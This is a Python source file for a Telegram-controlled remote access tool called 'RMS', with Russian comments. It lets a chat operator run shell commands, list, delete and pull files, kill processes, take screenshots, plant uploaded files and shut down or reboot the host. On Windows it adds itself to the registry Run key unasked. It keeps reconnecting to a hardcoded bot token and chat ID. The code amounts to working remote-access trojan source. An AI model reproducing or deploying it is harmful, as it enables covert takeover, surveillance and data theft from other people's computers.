import os, telebot, platform, time
from Modules import ls, mk, rm, cd, netinfo, whoami, download, execute, process, kill, run, cmd, link, screen, msg


if platform.system() == "Windows":
	import winreg
	from Modules import autorunoff

class MyProgram:
	def __init__(self, token, chat_id):
		self.token = token         # Инициализация токена Telegram-бота
		self.chat_id = chat_id         # Инициализация идентификатора чата в Telegram
		self.bot = telebot.TeleBot(self.token)         # Создание объекта бота с помощью библиотеки pytelegrambotapi

		@self.bot.message_handler(commands=['screen'])
		def screen(message):
			if platform.system() == "Windows":
				self.screen()
			elif platform.system() == 'Darwin':
				self.screen()

		@self.bot.message_handler(commands=['del'])   
		def remove_from_startup(message):
			if platform.system() == 'Windows':
				self.remove_from_startup()
				self.bot.send_message(chat_id=self.chat_id, text='Программа была удалена из автозапуска')
			elif platform.system() == 'Darwin':
				self.bot.send_message(chat_id=self.chat_id, text='Только для Windows')	
		
		@self.bot.message_handler(commands=['run'])
		def run(message):
			self.run(message)	

		@self.bot.message_handler(commands=['link'])
		def link(message):
			self.link(message)

		@self.bot.message_handler(commands=['msg'])
		def msg(message):
			self.msg(message)	

		@self.bot.message_handler(commands=['kill'])
		def kill(message):
			self.kill(message)	

		@self.bot.message_handler(commands=['process'])
		def process(message):
			self.process()		

		@self.bot.message_handler(commands=['execute'])
		def execute(message):
			self.execute(message)

		@self.bot.message_handler(commands=['download'])
		def download(message):
			self.download(message)

		@self.bot.message_handler(commands=['shutdown'])
		def shutdown(message):
			if platform.system() == 'Windows':
				os.system("shutdown /s /t 1")
			elif platform.system() == 'Darwin':
				os.system("sudo shutdown -h now")

		@self.bot.message_handler(commands=['reboot'])
		def reboot(message):
			if platform.system() == 'Windows':
				os.system("shutdown /r /t 1")
			elif platform.system() == 'Darwin':
				os.system("sudo shutdown -r now")

		@self.bot.message_handler(commands=['whoami'])
		def whoami(message):
			self.whoami()

		@self.bot.message_handler(commands=['ls'])
		def show_directory_list(message):
			self.ls(message)

		@self.bot.message_handler(commands=['mk'])
		def create_dir(message):
			self.mk(message)

		@self.bot.message_handler(commands=['rm'])
		def rm(message):
			self.rm(message)

		@self.bot.message_handler(commands=['cd'])
		def cd(message):
			self.cd(message)

		@self.bot.message_handler(commands=['net'])
		def netinfo(message):
			self.netinfo(message)

		@self.bot.message_handler(commands=['cmd'])
		def cmd(message):
			self.cmd(message)

		@self.bot.message_handler(commands=['autorun'])
		def add_to_startup(message):
			self.add_to_startup()

		@self.bot.message_handler(content_types=['document'])
		def handle_docs(message):
			self.bot.reply_to(message, "Введите путь для сохранения файла")
			self.bot.register_next_step_handler(message, self.handle_path, message.document)
	
	def link(self, message):
		link.link(self.bot, self.chat_id, message)
	
	def cmd(self, message):
		cmd.cmd(self.bot, self.chat_id, message)

	def msg(self, message):
		msg.msg(self.bot, self.chat_id, message)
	
	def run(self, message):
		run.run(self.bot, self.chat_id, message)

	def kill(self, message):
		kill.kill(self.bot, self.chat_id, message)

	def process(self):
		process.process(self.bot, self.chat_id)

	def execute(self, message):
		execute.execute(self.bot, self.chat_id, message)

	def download(self, message):
		download.download(self.bot, self.chat_id, message)

	def handle_path(self, message, document):
		path = message.text.strip()
		if not os.path.isdir(path):
			self.bot.reply_to(message, "Указанная директория не существует. Пожалуйста, укажите другую директорию.")
			return
		chat_id = message.chat.id
		file_info = self.bot.get_file(document.file_id)
		downloaded_file = self.bot.download_file(file_info.file_path)

		file_path = os.path.join(path, document.file_name)
		with open(file_path, 'wb') as new_file:
			new_file.write(downloaded_file)
		self.bot.reply_to(message, "Файл успешно сохранен по указанному пути")

	def whoami(self):
		whoami.whoami(self.bot, self.chat_id)	

	def netinfo(self,message):
		netinfo.netinfo(self.bot, self.chat_id, message)

	def cd(self,message):
		cd.cd(self.bot, self.chat_id, message)

	def rm(self,message):
		rm.rm(self.bot, self.chat_id, message)

	def mk(self,message):
		mk.create_dir(self.bot, self.chat_id, message)

	def ls(self,message):
		ls.dirlist(self.bot, self.chat_id, message)

	def screen(self):
		screen.screen(self.bot, self.chat_id)

	def remove_from_startup(self):
		autorunoff.remove_from_startup()

	def add_to_startup(self):
		script_path = os.path.abspath(__file__)
		key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_ALL_ACCESS)
		winreg.SetValueEx(key, "RMS", 0, winreg.REG_SZ, script_path)
		winreg.CloseKey(key)

	def is_in_startup(self):
			key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_READ)
			startup_programs = []
			try:
				i = 0
				while True:
					name, value, type = winreg.EnumValue(key, i)
					startup_programs.append(name)
					i += 1
			except WindowsError:
				pass
			winreg.CloseKey(key)
			return 'RMS' in startup_programs
		
	def run(self):
		self.bot.send_message(chat_id=self.chat_id, text='🤖 Bot connected.')
		if platform.system() == 'Windows':
			if not self.is_in_startup():
				self.add_to_startup()
		try:
			self.bot.polling()
		except Exception as e:
			print('Нет подключения к интернету')
			time.sleep(15)
			self.run()



my_program = MyProgram(token='6059733304:AAqOTPyXQ9dMex-RTq3WH2c', chat_id='376451117')
my_program.run()
